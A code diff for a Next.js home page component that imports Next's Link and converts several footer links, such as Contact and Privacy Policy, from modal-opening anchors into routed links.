@@ -4,6 +4,7 @@ import { site } from "../config/index";
 import { IoIosCloseCircle } from "react-icons/io";
 import useMockLogin from "../hooks/useMockLogin";
 import Image from "next/image";
+import Link from "next/link";
 
 export default function Home({ verifyId }) {
   const [visible, setVisible] = useState(false);
@@ -205,18 +206,18 @@ export default function Home({ verifyId }) {
         </div>
         
         {/* Links */}
-        <div className="text-center text-xs mb-4 space-x-1 text-gray-500">
-          <a href="#" onClick={handleOpenModal} className="hover:underline">Contact</a>
+        <div className="text-center text-xs mb-4 space-x-2 text-gray-500">
+          <Link href="/contact" className="hover:underline text-gray-500">Contact</Link>
           <span>|</span>
           <a href="#" onClick={handleOpenModal} className="hover:underline">Refund Policy</a>
           <span>|</span>
-          <a href="#" onClick={handleOpenModal} className="hover:underline">Complaints & Disputes</a>
+          <Link href="/complaints-disputes" className="hover:underline text-gray-500">Complaints & Disputes</Link>
           <span>|</span>
-          <a href="#" onClick={handleOpenModal} className="hover:underline">Terms & Conditions</a>
+          <Link href="/terms-conditions" className="hover:underline text-gray-500">Terms & Conditions</Link>
           <span>|</span>
           <a href="#" onClick={handleOpenModal} className="hover:underline">Law Enforcement Guide</a>
           <span>|</span>
-          <a href="#" onClick={handleOpenModal} className="hover:underline">Privacy Policy</a>
+          <Link href="/privacy-policy" className="hover:underline text-gray-500">Privacy Policy</Link>
         </div>
         
         {/* Copyright */}
